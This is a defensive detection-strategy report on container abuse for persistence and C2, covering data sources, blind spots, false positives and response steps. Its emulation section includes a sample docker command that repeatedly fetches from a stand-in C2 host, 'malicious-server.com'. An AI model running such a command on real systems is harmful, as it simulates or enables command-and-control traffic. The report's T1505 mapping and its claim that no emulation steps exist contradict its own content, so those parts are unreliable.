# Alerting & Detection Strategy (ADS) Report

## Goal
This detection strategy aims to identify adversarial attempts to bypass security monitoring systems by leveraging containers. Containers are often used by adversaries to obfuscate malicious activities, making them harder for traditional defenses to detect.

## Categorization
- **MITRE ATT&CK Mapping:** T1505 - Server Software Component
- **Tactic / Kill Chain Phases:** Persistence
- **Platforms:** Windows, Linux, macOS  
  [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1505)

## Strategy Abstract
The detection strategy focuses on identifying anomalous container activities that may indicate adversarial actions. Key data sources include:
- Container orchestration logs (e.g., Kubernetes)
- System and application logs
- Network traffic analysis

Patterns analyzed involve:
- Unusual or unauthorized changes in container configurations
- Anomalous network communications from containers to external endpoints
- Unexpected resource consumption by containers

## Technical Context
Adversaries may use containers to deploy persistent backdoors, execute command-and-control (C2) operations, or hide malware activities. They typically exploit configuration weaknesses and inadequate monitoring of container environments.

**Adversary Emulation Details:**
In real-world scenarios, adversaries might:
- Use known vulnerabilities in container software to gain unauthorized access.
- Deploy C2 servers within containers to maintain persistence.
  
Sample commands for emulation (test environment only):
```bash
# Start a suspicious Docker container
docker run -d --name malicious_container busybox sh -c 'while true; do wget http://malicious-server.com/c2; done'

# Inspect unusual network traffic from the container
sudo tcpdump -i eth0 host <container_ip>
```

## Blind Spots and Assumptions
- **Blind Spots:** Detection may miss sophisticated evasion techniques like encrypted C2 communications or use of legitimate cloud services for malicious purposes.
- **Assumptions:** The strategy assumes that baseline behaviors are well-defined and monitored. It also presumes network monitoring can differentiate between benign and malicious container traffic.

## False Positives
Potential false positives include:
- Legitimate containers with high resource usage during peak operations.
- Authorized changes to configurations by IT personnel or DevOps teams.

## Priority
**High:** Containers provide significant advantages for adversaries in terms of stealth and persistence, making their detection crucial. The increasing use of containerized environments across organizations amplifies this risk.

## Validation (Adversary Emulation)
Currently, no specific adversary emulation steps are available within the framework. Organizations should develop tailored scenarios based on known adversarial behaviors relevant to their environment.

## Response
When an alert is triggered:
1. **Verify Alert:** Confirm whether the detected activity aligns with recent changes or authorized actions.
2. **Isolate Container:** Temporarily isolate the suspicious container to prevent potential lateral movement or data exfiltration.
3. **Investigate Logs:** Examine orchestration, system, and network logs for further context on the anomaly.
4. **Coordinate Response:** Engage incident response teams if malicious intent is confirmed.

## Additional Resources
Currently, no additional references are available. Organizations should refer to their own security documentation and threat intelligence sources for more detailed guidance specific to containerized environments.
